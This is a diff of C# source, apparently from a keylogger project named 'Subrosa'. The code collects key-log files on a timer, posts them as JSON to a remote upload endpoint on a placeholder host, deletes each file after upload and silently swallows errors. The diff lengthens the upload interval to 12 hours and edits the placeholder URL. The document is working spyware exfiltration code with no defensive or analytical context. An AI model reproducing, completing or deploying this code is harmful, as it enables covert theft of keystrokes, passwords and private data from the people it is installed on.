@@ -20,8 +20,7 @@ namespace Subrosa
         {
             _worker = new BackgroundWorker();
             _worker.DoWork += CheckKeyLogs;
-            //_timer = new Timer(43200000); //12 hour delay
-            _timer = new Timer(300000);
+            _timer = new Timer(43200000); //12 hour delay
             _timer.Elapsed += TimerElapsed;
             _timer.Start();
         }
@@ -48,7 +47,9 @@ namespace Subrosa
                     if (await UploadFile(model))
                         files[i].Delete();
                 }
-                catch(Exception e){}
+                catch(Exception ex)
+                {
+                }
             }
         }
 
@@ -57,7 +58,7 @@ namespace Subrosa
             string json = JsonConvert.SerializeObject(log);
             HttpClient client = new HttpClient();
             StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
-            HttpResponseMessage response = await client.PostAsync("http://www.yoururlhere.com:8889/Upload", content);
+            HttpResponseMessage response = await client.PostAsync("http://www.yourUrlEndPoint.com:8889/Upload", content);
 
             if (response.StatusCode == HttpStatusCode.OK)
                 return true;
